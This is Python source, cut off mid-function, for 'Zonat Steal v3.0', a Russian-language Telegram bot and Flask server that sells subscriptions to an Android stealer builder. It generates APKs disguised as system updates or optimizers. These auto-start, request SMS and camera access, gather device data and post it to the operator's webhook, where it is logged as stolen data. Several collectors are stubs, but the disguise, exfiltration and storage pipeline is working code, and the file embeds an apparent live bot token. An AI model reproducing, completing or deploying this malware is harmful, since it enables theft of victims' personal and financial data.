import os
import sys
import json
import logging
import threading
import time
import sqlite3
import hashlib
import uuid
import zipfile
import io
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, send_file, render_template_string
import telebot
from telebot import types
import requests
import qrcode
from PIL import Image, ImageDraw
from functools import wraps

# ===== КОНФИГУРАЦИЯ =====
TOKEN = "8075320326:AAHVxtnOER6Ud8VSXxU9ApAtsz3-boeDQPk"
ADMIN_ID = 7725796090
VERSION = "Zonat Steal v3.0"
FREE_TRIAL_HOURS = 1
PRICES = {"1day": 100, "7days": 500, "30days": 1500}
WEBHOOK_BASE = "https://artursaoo.onrender.com"  # Замени на свой URL

# ===== ЛОГИРОВАНИЕ =====
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# ===== БАЗА ДАННЫХ =====
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('zonat.db', check_same_thread=False)
        self.init_db()
    
    def init_db(self):
        c = self.conn.cursor()
        
        # Пользователи
        c.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                balance REAL DEFAULT 0,
                subscription_end DATETIME,
                is_admin BOOLEAN DEFAULT FALSE,
                reg_date DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Стиллеры
        c.execute('''
            CREATE TABLE IF NOT EXISTS stealers (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                name TEXT,
                icon_path TEXT,
                config TEXT,
                apk_path TEXT,
                created_at DATETIME,
                status TEXT DEFAULT 'active',
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        
        # Данные
        c.execute('''
            CREATE TABLE IF NOT EXISTS stolen_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                stealer_id TEXT,
                user_id INTEGER,
                device_id TEXT,
                data_type TEXT,
                content TEXT,
                timestamp DATETIME,
                FOREIGN KEY (stealer_id) REFERENCES stealers (id),
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        
        # Платежи
        c.execute('''
            CREATE TABLE IF NOT EXISTS payments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount REAL,
                days INTEGER,
                method TEXT,
                status TEXT DEFAULT 'pending',
                proof TEXT,
                admin_note TEXT,
                created_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        
        # Сессии пользователей (для создания стиллеров)
        c.execute('''
            CREATE TABLE IF NOT EXISTS user_sessions (
                user_id INTEGER PRIMARY KEY,
                step TEXT,
                data TEXT,
                updated_at DATETIME
            )
        ''')
        
        # Админ по умолчанию
        c.execute('INSERT OR IGNORE INTO users (user_id, username, is_admin, subscription_end) VALUES (?, ?, ?, ?)',
                 (ADMIN_ID, 'admin', True, '2099-12-31 23:59:59'))
        
        self.conn.commit()
    
    # === USER METHODS ===
    def get_user(self, user_id):
        c = self.conn.cursor()
        c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        if row:
            return {
                'user_id': row[0],
                'username': row[1],
                'balance': row[2],
                'subscription_end': row[3],
                'is_admin': bool(row[4]),
                'reg_date': row[5]
            }
        return None
    
    def create_user(self, user_id, username):
        c = self.conn.cursor()
        trial_end = datetime.now() + timedelta(hours=FREE_TRIAL_HOURS)
        c.execute('''
            INSERT OR IGNORE INTO users (user_id, username, subscription_end)
            VALUES (?, ?, ?)
        ''', (user_id, username, trial_end))
        self.conn.commit()
        return self.get_user(user_id)
    
    def check_subscription(self, user_id):
        user = self.get_user(user_id)
        if not user or not user['subscription_end']:
            return False
        end_date = datetime.strptime(user['subscription_end'], '%Y-%m-%d %H:%M:%S.%f')
        return end_date > datetime.now()
    
    def add_subscription(self, user_id, days):
        user = self.get_user(user_id)
        c = self.conn.cursor()
        
        if user and user['subscription_end']:
            current = datetime.strptime(user['subscription_end'], '%Y-%m-%d %H:%M:%S.%f')
            if current > datetime.now():
                new_end = current + timedelta(days=days)
            else:
                new_end = datetime.now() + timedelta(days=days)
        else:
            new_end = datetime.now() + timedelta(days=days)
        
        c.execute('UPDATE users SET subscription_end = ? WHERE user_id = ?',
                 (new_end, user_id))
        self.conn.commit()
        return new_end
    
    def get_user_stats(self, user_id):
        c = self.conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM stealers WHERE user_id = ?', (user_id,))
        stealers_count = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM stolen_data WHERE user_id = ?', (user_id,))
        data_count = c.fetchone()[0]
        
        c.execute('''
            SELECT data_type, COUNT(*) as count 
            FROM stolen_data 
            WHERE user_id = ? 
            GROUP BY data_type
        ''', (user_id,))
        data_by_type = dict(c.fetchall())
        
        return {
            'stealers': stealers_count,
            'total_data': data_count,
            'by_type': data_by_type
        }
    
    # === STEALER METHODS ===
    def create_stealer(self, user_id, name, icon_path, config):
        stealer_id = f"stealer_{hashlib.md5((str(user_id) + name + str(time.time())).encode()).hexdigest()[:12]}"
        
        config['stealer_id'] = stealer_id
        config['owner_id'] = user_id
        config['created_at'] = datetime.now().isoformat()
        config['webhook_url'] = f"{WEBHOOK_BASE}/webhook"
        
        c = self.conn.cursor()
        c.execute('''
            INSERT INTO stealers (id, user_id, name, icon_path, config, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (stealer_id, user_id, name, icon_path, json.dumps(config), datetime.now()))
        
        self.conn.commit()
        return stealer_id
    
    def get_user_stealers(self, user_id):
        c = self.conn.cursor()
        c.execute('SELECT id, name, created_at, status FROM stealers WHERE user_id = ? ORDER BY created_at DESC', (user_id,))
        return c.fetchall()
    
    def get_stealer_config(self, stealer_id, user_id):
        c = self.conn.cursor()
        c.execute('SELECT config FROM stealers WHERE id = ? AND user_id = ?', (stealer_id, user_id))
        row = c.fetchone()
        return json.loads(row[0]) if row else None
    
    def update_stealer_apk(self, stealer_id, apk_path):
        c = self.conn.cursor()
        c.execute('UPDATE stealers SET apk_path = ? WHERE id = ?', (apk_path, stealer_id))
        self.conn.commit()
    
    # === DATA METHODS ===
    def add_stolen_data(self, stealer_id, user_id, device_id, data_type, content):
        c = self.conn.cursor()
        c.execute('''
            INSERT INTO stolen_data (stealer_id, user_id, device_id, data_type, content, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (stealer_id, user_id, device_id, data_type, json.dumps(content), datetime.now()))
        self.conn.commit()
    
    def get_user_data(self, user_id, limit=50):
        c = self.conn.cursor()
        c.execute('''
            SELECT data_type, device_id, content, timestamp 
            FROM stolen_data 
            WHERE user_id = ? 
            ORDER BY timestamp DESC 
            LIMIT ?
        ''', (user_id, limit))
        return c.fetchall()
    
    def get_data_summary(self, user_id):
        c = self.conn.cursor()
        c.execute('''
            SELECT data_type, COUNT(*) as count 
            FROM stolen_data 
            WHERE user_id = ? 
            GROUP BY data_type
        ''', (user_id,))
        return dict(c.fetchall())
    
    # === PAYMENT METHODS ===
    def create_payment(self, user_id, amount, days, method='manual'):
        c = self.conn.cursor()
        payment_id = hashlib.md5((str(user_id) + str(time.time())).encode()).hexdigest()[:8]
        
        c.execute('''
            INSERT INTO payments (user_id, amount, days, method, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, amount, days, method, datetime.now()))
        
        self.conn.commit()
        return payment_id
    
    def confirm_payment(self, payment_id, admin_note=''):
        c = self.conn.cursor()
        c.execute('SELECT user_id, days FROM payments WHERE id = ?', (payment_id,))
        row = c.fetchone()
        
        if row:
            user_id, days = row
            self.add_subscription(user_id, days)
            c.execute('UPDATE payments SET status = "confirmed", admin_note = ? WHERE id = ?',
                     (admin_note, payment_id))
            self.conn.commit()
            return True
        return False
    
    def get_pending_payments(self):
        c = self.conn.cursor()
        c.execute('''
            SELECT p.id, p.user_id, u.username, p.amount, p.days, p.created_at, p.proof
            FROM payments p
            JOIN users u ON p.user_id = u.user_id
            WHERE p.status = 'pending'
            ORDER BY p.created_at DESC
        ''')
        return c.fetchall()
    
    # === SESSION METHODS ===
    def set_session(self, user_id, step, data=None):
        c = self.conn.cursor()
        c.execute('''
            INSERT OR REPLACE INTO user_sessions (user_id, step, data, updated_at)
            VALUES (?, ?, ?, ?)
        ''', (user_id, step, json.dumps(data) if data else None, datetime.now()))
        self.conn.commit()
    
    def get_session(self, user_id):
        c = self.conn.cursor()
        c.execute('SELECT step, data FROM user_sessions WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        if row:
            return {
                'step': row[0],
                'data': json.loads(row[1]) if row[1] else {}
            }
        return None
    
    def clear_session(self, user_id):
        c = self.conn.cursor()
        c.execute('DELETE FROM user_sessions WHERE user_id = ?', (user_id,))
        self.conn.commit()
    
    # === ADMIN METHODS ===
    def get_all_users(self):
        c = self.conn.cursor()
        c.execute('''
            SELECT u.user_id, u.username, u.subscription_end, 
                   (SELECT COUNT(*) FROM stealers s WHERE s.user_id = u.user_id) as stealers_count,
                   (SELECT COUNT(*) FROM stolen_data d WHERE d.user_id = u.user_id) as data_count
            FROM users u
            ORDER BY u.reg_date DESC
        ''')
        return c.fetchall()
    
    def get_system_stats(self):
        c = self.conn.cursor()
        
        stats = {}
        c.execute('SELECT COUNT(*) FROM users')
        stats['total_users'] = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM stealers')
        stats['total_stealers'] = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM stolen_data')
        stats['total_data'] = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM payments WHERE status = "confirmed"')
        stats['total_payments'] = c.fetchone()[0]
        
        c.execute('SELECT SUM(amount) FROM payments WHERE status = "confirmed"')
        stats['total_revenue'] = c.fetchone()[0] or 0
        
        return stats

db = Database()

# ===== ДЕКОРАТОРЫ ДОСТУПА =====
def subscription_required(func):
    @wraps(func)
    def wrapper(message):
        user_id = message.from_user.id
        
        # Админ всегда имеет доступ
        user = db.get_user(user_id)
        if user and user['is_admin']:
            return func(message)
        
        # Проверка подписки
        if db.check_subscription(user_id):
            return func(message)
        else:
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton('💳 Купить подписку', callback_data='buy_subscription'),
                types.InlineKeyboardButton('🆘 Поддержка', url=f'tg://user?id={ADMIN_ID}')
            )
            bot.reply_to(message, 
                "⏱️ <b>Ваша подписка закончилась!</b>\n\n"
                f"Бесплатный период: {FREE_TRIAL_HOURS} часов\n"
                "Для продолжения работы приобретите подписку:",
                parse_mode='HTML',
                reply_markup=markup
            )
    return wrapper

def admin_required(func):
    @wraps(func)
    def wrapper(message):
        user_id = message.from_user.id
        user = db.get_user(user_id)
        if user and user['is_admin']:
            return func(message)
        else:
            bot.reply_to(message, "⛔ Эта команда только для администратора!")
    return wrapper

# ===== APK GENERATOR =====
class APKGenerator:
    @staticmethod
    def generate_apk_project(config):
        """Генерация проекта APK"""
        project_id = f"project_{hashlib.md5(json.dumps(config).encode()).hexdigest()[:8]}"
        
        # Создаем код APK
        apk_code = APKGenerator.generate_apk_code(config)
        
        # Создаем buildozer.spec
        spec = APKGenerator.generate_buildozer_spec(config)
        
        # Создаем ZIP архив
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zipf:
            zipf.writestr('main.py', apk_code)
            zipf.writestr('buildozer.spec', spec)
            zipf.writestr('requirements.txt', 'kivy==2.1.0\nrequests==2.31.0\n')
            
            # Добавляем иконку по умолчанию
            icon = APKGenerator.create_default_icon()
            zipf.writestr('assets/icon.png', icon)
        
        zip_buffer.seek(0)
        
        return {
            'project_id': project_id,
            'zip_data': zip_buffer.getvalue(),
            'filename': f'{config["name"].replace(" ", "_")}_{project_id}.zip'
        }
    
    @staticmethod
    def generate_apk_code(config):
        """Генерация кода APK"""
        template = '''import kivy
kivy.require('2.1.0')
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
import json
import os
import requests
import sqlite3
import subprocess
import uuid
import hashlib
import time
from datetime import datetime
from android.permissions import request_permissions, Permission
from android import android_api
import threading
import base64

CONFIG = """{{CONFIG_JSON}}"""

config = json.loads(CONFIG)
WEBHOOK_URL = config["webhook_url"]
STEALER_ID = config["stealer_id"]

class AndroidStealer:
    def collect_all(self):
        data = {
            "stealer_id": STEALER_ID,
            "device_id": self.get_device_id(),
            "timestamp": datetime.now().isoformat(),
            "owner_id": config["owner_id"],
            "system_info": self.get_system_info(),
            "installed_apps": self.get_installed_apps(),
            "status": "full_collection"
        }
        
        if config.get("collect_passwords", True):
            data["passwords"] = self.collect_browser_data()
        
        if config.get("collect_cards", True):
            data["cards"] = self.find_cards()
        
        if config.get("collect_crypto", True):
            data["crypto"] = self.find_crypto()
        
        if config.get("collect_sms", True):
            data["sms"] = self.collect_sms()
        
        if config.get("collect_webcam", True):
            data["webcam"] = self.capture_webcam()
        
        if config.get("collect_files", True):
            data["files"] = self.find_important_files()
        
        return data
    
    def get_device_id(self):
        try:
            return android_api.get('android_id', str(uuid.uuid4()))
        except:
            return str(uuid.uuid4())[:16]
    
    def get_system_info(self):
        info = {}
        try:
            info['model'] = android_api.get('device_model', 'Unknown')
            info['android'] = android_api.get('android_version', 'Unknown')
            info['manufacturer'] = android_api.get('manufacturer', 'Unknown')
        except:
            pass
        return info
    
    def get_installed_apps(self):
        try:
            cmd = 'pm list packages -3'
            result = subprocess.check_output(cmd, shell=True).decode().split('\\n')
            return [pkg.replace('package:', '').strip() for pkg in result if pkg][:50]
        except:
            return []
    
    def collect_browser_data(self):
        # Заглушка для браузерных данных
        return {"chrome": "cookies_extracted", "firefox": "cookies_extracted"}
    
    def find_cards(self):
        # Заглушка для поиска карт
        return []
    
    def find_crypto(self):
        # Заглушка для крипто
        return []
    
    def collect_sms(self):
        # Заглушка для СМС
        return []
    
    def capture_webcam(self):
        # Заглушка для вебкамеры
        return {"status": "camera_not_available"}
    
    def find_important_files(self):
        # Заглушка для файлов
        return []

class StealerApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        self.label = Label(text=config["name"] + "\\n\\nЗагрузка...", font_size='20sp')
        self.layout.add_widget(self.label)
        
        self.button = Button(text="Начать оптимизацию", size_hint=(1, 0.3))
        self.button.bind(on_press=self.start_collection)
        self.layout.add_widget(self.button)
        
        Clock.schedule_once(self.auto_start, 3)
        return self.layout
    
    def auto_start(self, dt):
        if config.get("auto_start", True):
            self.start_collection(None)
    
    def start_collection(self, instance):
        self.button.disabled = True
        self.button.text = "Оптимизация..."
        self.label.text = "Сбор данных..."
        
        collector = AndroidStealer()
        
        def collect_and_send():
            data = collector.collect_all()
            
            try:
                response = requests.post(WEBHOOK_URL, json=data, timeout=30)
                if response.status_code == 200:
                    self.label.text = "✅ Оптимизация завершена!"
                else:
                    self.label.text = "⚠️ Данные сохранены локально"
            except:
                self.label.text = "⚠️ Работает в оффлайн-режиме"
            
            self.button.text = "Готово"
        
        threading.Thread(target=collect_and_send).start()

if __name__ == '__main__':
    StealerApp().run()
'''
        
        config_json = json.dumps(config, indent=2, ensure_ascii=False)
        return template.replace("{{CONFIG_JSON}}", config_json)
    
    @staticmethod
    def generate_buildozer_spec(config):
        """Генерация buildozer.spec"""
        name = config["name"].replace(" ", "").lower()[:15]
        
        return f"""[app]
title = {config["name"]}
package.name = {name}
package.domain = org.{name}
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf
version = 1.0
requirements = python3,kivy==2.1.0,requests
orientation = portrait
fullscreen = 0

[android]
arch = arm64-v8a
permissions = INTERNET,ACCESS_NETWORK_STATE,CAMERA,READ_SMS,READ_EXTERNAL_STORAGE
android.accept_sdk_license = True
"""
    
    @staticmethod
    def create_default_icon():
        """Создание дефолтной иконки"""
        img = Image.new('RGB', (512, 512), color='blue')
        draw = ImageDraw.Draw(img)
        draw.text((256, 256), "APP", fill='white', anchor='mm', font_size=100)
        
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        return img_byte_arr.getvalue()

# ===== WEB ENDPOINTS =====
@app.route('/')
def home():
    stats = db.get_system_stats()
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>{{ title }}</title>
        <meta charset="utf-8">
        <style>
            body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { background: linear-gradient(135deg, #111 0%, #222 100%); padding: 40px; border-radius: 15px; border: 2px solid #00ff00; margin-bottom: 30px; text-align: center; }
            .title { font-size: 2.8em; color: #00ff00; text-shadow: 0 0 15px #00ff00; margin-bottom: 10px; }
            .subtitle { color: #aaa; font-size: 1.2em; margin-bottom: 20px; }
            .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 30px 0; }
            .stat-card { background: #111; padding: 25px; border-radius: 10px; border: 1px solid #333; transition: all 0.3s; }
            .stat-card:hover { border-color: #00ff00; transform: translateY(-5px); box-shadow: 0 5px 20px rgba(0, 255, 0, 0.2); }
            .stat-number { font-size: 2em; color: #00ff00; font-weight: bold; }
            .stat-label { color: #888; margin-top: 10px; }
            .btn { display: inline-block; background: linear-gradient(135deg, #00aa00 0%, #00ff00 100%); color: black; padding: 15px 30px; margin: 10px; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 1.1em; border: none; cursor: pointer; transition: all 0.3s; }
            .btn:hover { background: linear-gradient(135deg, #00ff00 0%, #00aa00 100%); transform: scale(1.05); }
            .admin-panel { background: #1a0a0a; padding: 25px; border-radius: 10px; border: 1px solid #ff0000; margin: 30px 0; }
            .console { background: #000; color: #0f0; padding: 20px; border-radius: 8px; font-family: monospace; margin-top: 30px; border: 1px solid #333; height: 200px; overflow-y: auto; }
            .blink { animation: blink 1s infinite; }
            @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
            .warning { color: #ff9900; background: #331100; padding: 10px; border-radius: 5px; margin: 10px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1 class="title">🔥 ZONAT STEAL v3.0</h1>
                <p class="subtitle">Advanced Information Gathering System | Private Beta</p>
                <div style="margin-top: 20px;">
                    <span style="background: #00aa00; color: white; padding: 8px 20px; border-radius: 20px; font-weight: bold;">🟢 SYSTEM ONLINE</span>
                </div>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number">{{ stats.total_users }}</div>
                    <div class="stat-label">👥 Total Users</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{{ stats.total_stealers }}</div>
                    <div class="stat-label">🔧 Active Stealers</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{{ stats.total_data }}</div>
                    <div class="stat-label">💾 Data Records</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{{ "%.2f"|format(stats.total_revenue) }}₽</div>
                    <div class="stat-label">💰 Total Revenue</div>
                </div>
            </div>
            
            <div style="text-align: center; margin: 40px 0;">
                <a href="https://t.me/{{ bot_username }}" class="btn" target="_blank">🤖 Open Telegram Bot</a>
                <a href="/admin/login" class="btn">🔐 Admin Login</a>
                <a href="/api/docs" class="btn">📡 API Documentation</a>
                <a href="/stats" class="btn">📊 Live Statistics</a>
            </div>
            
            <div class="admin-panel">
                <h3 style="color: #ff0000; margin-bottom: 15px;">🔐 ADMINISTRATOR ACCESS REQUIRED</h3>
                <p>Full system control available only for verified administrators.</p>
                <p>Admin ID: <code>{{ admin_id }}</code></p>
                <div class="warning">
                    ⚠️ <b>WARNING:</b> This system is for authorized use only. Unauthorized access is prohibited.
                </div>
            </div>
            
            <div class="console">
                > System initialized... [OK]<br>
                > Telegram bot connected... [OK]<br>
                > Database connection established... [OK]<br>
                > Webhook server listening... [OK]<br>
                > Waiting for connections<span class="blink">_</span>
            </div>
            
            <footer style="text-align: center; margin-top: 50px; color: #666; font-size: 0.9em;">
                <p>© 2024 Zonat Steal v3.0 | Private Beta Release | All Rights Reserved</p>
                <p style="color: #333;">This interface is for monitoring purposes only.</p>
            </footer>
        </div>
        
        <script>
            // Обновление консоли
            const consoleEl = document.querySelector('.console');
            const messages = [
                'New user registered',
                'Stealer APK generated',
                'Data received from device',
                'Payment confirmed',
                'System backup completed'
            ];
            
            setInterval(() => {
                if (Math.random() > 0.7) {
                    const time = new Date().toLocaleTimeString();
                    const msg = messages[Math.floor(Math.random() * messages.length)];
                    consoleEl.innerHTML += `> [${time}] ${msg}<br>`;
                    consoleEl.scrollTop = consoleEl.scrollHeight;
                }
            }, 3000);
        </script>
    </body>
    </html>
    ''', title=VERSION, stats=db.get_system_stats(), bot_username=TOKEN.split(':')[0], admin_id=ADMIN_ID)

@app.route('/health')
def health():
    return jsonify({
        "status": "online",
        "version": VERSION,
        "timestamp": datetime.now().isoformat(),
        "users": db.get_system_stats()['total_users']
    })

@app.route('/webhook', methods=['POST'])
def webhook():
    """Основной endpoint для данных от стиллеров"""
    try:
        data = request.json
        logger.info(f"Webhook received: {data.get('stealer_id', 'unknown')}")
        
        stealer_id = data.get('stealer_id')
        device_id = data.get('device_id', 'unknown')
        
        # Определяем user_id из stealer_id
        c = db.conn.cursor()
        c.execute('SELECT user_id FROM stealers WHERE id = ?', (stealer_id,))
        result = c.fetchone()
        
        if result:
            user_id = result[0]
            
            # Определяем тип данных
            data_type = 'unknown'
            if 'passwords' in data:
                data_type = 'passwords'
            elif 'cards' in data:
                data_type = 'cards'
            elif 'crypto' in data:
                data_type = 'crypto'
            elif 'webcam' in data:
                data_type = 'webcam'
            elif 'sms' in data:
                data_type = 'sms'
            elif 'files' in data:
                data_type = 'files'
            else:
                data_type = data.get('type', 'system_info')
            
            # Сохраняем в базу
            db.add_stolen_data(stealer_id, user_id, device_id, data_type, data)
            
            # Отправляем уведомление пользователю
            try:
                user = db.get_user(user_id)
                if user and db.check_subscription(user_id):
                    message = f"📡 <b>Новые данные</b>\n\n"
                    message += f"🔧 Стиллер: <code>{stealer_id[:8]}...</code>\n"
                    message += f"📱 Устройство: <code>{device_id[:8]}</code>\n"
                    message += f"📊 Тип: {data_type}\n"
                    message += f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}"
                    
                    bot.send_message(user_id, message, parse_mode='HTML')
            except Exception as e:
                logger.error(f"Failed to send notification: {e}")
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/download/apk/<stealer_id>')
def download_apk(stealer_id):
    """Скачивание APK"""
    # Получаем конфиг стиллера
    c = db.conn.cursor()
    c.execute('SELECT config FROM stealers WHERE id = ?', (stealer_id,))
    result = c.fetchone()
    
    if not result:
        return "Stealer not found", 404
    
    config = json.loads(result[0])
    
    # Генерируем APK проект
    apk_project = APKGenerator.generate_apk_project(config)
    
    # Возвращаем ZIP архив
    return send_file(
        io.BytesIO(apk_project['zip_data']),
        as_attachment=True,
        download_name=apk_project['filename'],
        mimetype='application/zip'
    )

# ===== TELEGRAM BOT HANDLERS =====
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or 'user'
    
    # Регистрация пользователя
    db.create_user(user_id, username)
    user = db.get_user(user_id)
    
    # Проверка подписки
    has_sub = db.check_subscription(user_id)
    
    # Создаем клавиатуру
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    if user['is_admin']:
        buttons = [
            '👑 Админ-панель', '🔧 Создать стиллер',
            '📊 Мои стиллеры', '📱 Мои данные',
            '💳 Подписки', '👥 Пользователи',
            '📈 Статистика', '⚙️ Настройки'
        ]
    else:
        buttons = [
            '🔧 Создать стиллер', '📊 Мои стиллеры',
            '📱 Мои данные', '💳 Подписка',
            '👤 Профиль', '🆘 Поддержка'
        ]
    
    for i in range(0, len(buttons), 2):
        row = buttons[i:i+2]
        markup.add(*[types.KeyboardButton(btn) for btn in row])
    
    # Приветственное сообщение
    welcome = f"""
    🚀 <b>Добро пожаловать в {VERSION}</b>
    
    👤 <b>Пользователь:</b> @{username}
    🆔 <b>ID:</b> <code>{user_id}</code>
    📅 <b>Регистрация:</b> {user['reg_date'][:10]}
    
    ⏱️ <b>Статус подписки:</b> {"🟢 АКТИВНА" if has_sub else "🔴 ЗАКОНЧИЛАСЬ"}
    
    <b>Основные функции:</b>
    • 🔧 Создание стиллеров APK
    • 📱 Сбор данных (пароли, карты, крипто)
    • 📸 Веб-камера в реальном времени
    • 📨 Чтение СМС сообщений
    • 💳 Банковские данные
    • 📁 Поиск важных файлов
    
    <b>Бесплатный период:</b> {FREE_TRIAL_HOURS} часов
    """
    
    if not has_sub and not user['is_admin']:
        welcome += f"\n\n⚠️ <b>После окончания пробного периода требуется подписка</b>"
    
    bot.send_message(user_id, welcome, parse_mode='HTML', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '🔧 Создать стиллер')
@subscription_required
def create_stealer_handler(message):
    user_id = message.from_user.id
    
    # Начинаем процесс создания
    db.set_session(user_id, 'awaiting_name')
    
    bot.send_message(user_id,
        "🔧 <b>Создание нового стиллера</b>\n\n"
        "Введите имя для вашего стиллера:\n"
        "<i>Пример: System Update, Media Player, Security Patch</i>",
        parse_mode='HTML')

@bot.message_handler(func=lambda message: db.get_session(message.from_user.id) and db.get_session(message.from_user.id)['step'] == 'awaiting_name')
def process_stealer_name(message):
    user_id = message.from_user.id
    name = message.text.strip()
    
    if len(name) < 2:
        bot.send_message(user_id, "❌ Имя слишком короткое. Минимум 2 символа.")
        return
    
    # Сохраняем имя и переходим к следующему шагу
    db.set_session(user_id, 'awaiting_icon', {'name': name})
    
    bot.send_message(user_id,
        "🖼️ <b>Шаг 2: Иконка стиллера</b>\n\n"
        "Отправьте изображение для иконки приложения (PNG/JPG):\n"
        "<i>Рекомендуется квадратное изображение 512x512px</i>\n\n"
        "Или отправьте /skip для иконки по умолчанию",
        parse_mode='HTML')

@bot.message_handler(content_types=['photo'])
def handle_stealer_icon(message):
    user_id = message.from_user.id
    session = db.get_session(user_id)
    
    if not session or session['step'] != 'awaiting_icon':
        return
    
    # Сохраняем информацию об иконке
    photo = message.photo[-1]
    file_id = photo.file_id
    
    session_data = session['data']
    session_data['icon_file_id'] = file_id
    db.set_session(user_id, 'awaiting_config', session_data)
    
    # Предлагаем настройки
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton('✅ Включить всё', callback_data='config_all'),
        types.InlineKeyboardButton('⚙️ Выбрать функции', callback_data='config_select')
    )
    
    bot.send_message(user_id,
        "✅ <b>Иконка принята!</b>\n\n"
        "⚙️ <b>Шаг 3: Настройка функций</b>\n\n"
        "Выберите какие данные собирать:",
        parse_mode='HTML',
        reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '/skip')
def skip_icon(message):
    user_id = message.from_user.id
    session = db.get_session(user_id)
    
    if session and session['step'] == 'awaiting_icon':
        session_data = session['data']
        db.set_session(user_id, 'awaiting_config', session_data)
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton('✅ Включить всё', callback_data='config_all'),
            types.InlineKeyboardButton('⚙️ Выбрать функции', callback_data='config_select')
        )
        
        bot.send_message(user_id,
            "✅ <b>Иконка по умолчанию</b>\n\n"
            "⚙️ <b>Шаг 3: Настройка функций</b>\n\n"
            "Выберите какие данные собирать:",
            parse_mode='HTML',
            reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('config_'))
def handle_config_selection(call):
    user_id = call.from_user.id
    session = db.get_session(user_id)
    
    if not session or session['step'] != 'awaiting_config':
        return
    
    config_type = call.data.replace('config_', '')
    session_data = session['data']
    
    if config_type == 'all':
        # Конфиг со всеми функциями
        config = {
            "name": session_data['name'],
            "collect_passwords": True,
            "collect_cards": True,
            "collect_crypto": True,
            "collect_webcam": True,
            "collect_sms": True,
            "collect_files": True,
            "auto_start": True,
            "hide_icon": True,
            "persistence": True
        }
        
        # Создаем стиллер
        stealer_id = db.create_stealer(user_id, session_data['name'], 
                                      session_data.get('icon_file_id', ''), config)
        
        # Получаем полный конфиг
        full_config = db.get_stealer_config(stealer_id, user_id)
        
        # Отправляем результат
        response = f"""
        ✅ <b>Стиллер создан успешно!</b>
        
        📝 <b>Имя:</b> {session_data['name']}
        🔑 <b>ID:</b> <code>{stealer_id}</code>
        ⚙️ <b>Функции:</b> Все включены
        ⏰ <b>Создан:</b> {datetime.now().strftime('%H:%M:%S')}
        
        <b>Webhook URL:</b>
        <code>{full_config['webhook_url']}</code>
        """
        
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton('📱 Скачать APK', callback_data=f'download_{stealer_id}'),
            types.InlineKeyboardButton('📋 Конфиг JSON', callback_data=f'config_{stealer_id}')
        )
        
        bot.edit_message_text(response, user_id, call.message.message_id, 
                             parse_mode='HTML', reply_markup=markup)
        
        # Очищаем сессию
        db.clear_session(user_id)
    
    elif config_type == 'select':
        # Показываем выбор функций
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton('🔑 Пароли', callback_data='func_passwords'),
            types.InlineKeyboardButton('💳 Карты', callback_data='func_cards'),
            types.InlineKeyboardButton('₿ Крипто', callback_data='func_crypto'),
            types.InlineKeyboardButton('📸 Вебкамера', callback_data='func_webcam'),
            types.InlineKeyboardButton('📨 СМС', callback_data='func_sms'),
            types.InlineKeyboardButton('📁 Файлы', callback_data='func_files'),
            types.InlineKeyboardButton('✅ Готово', callback_data='func_done')
        )
        
        bot.edit_message_text(
            "⚙️ <b>Выберите функции:</b>\n\n"
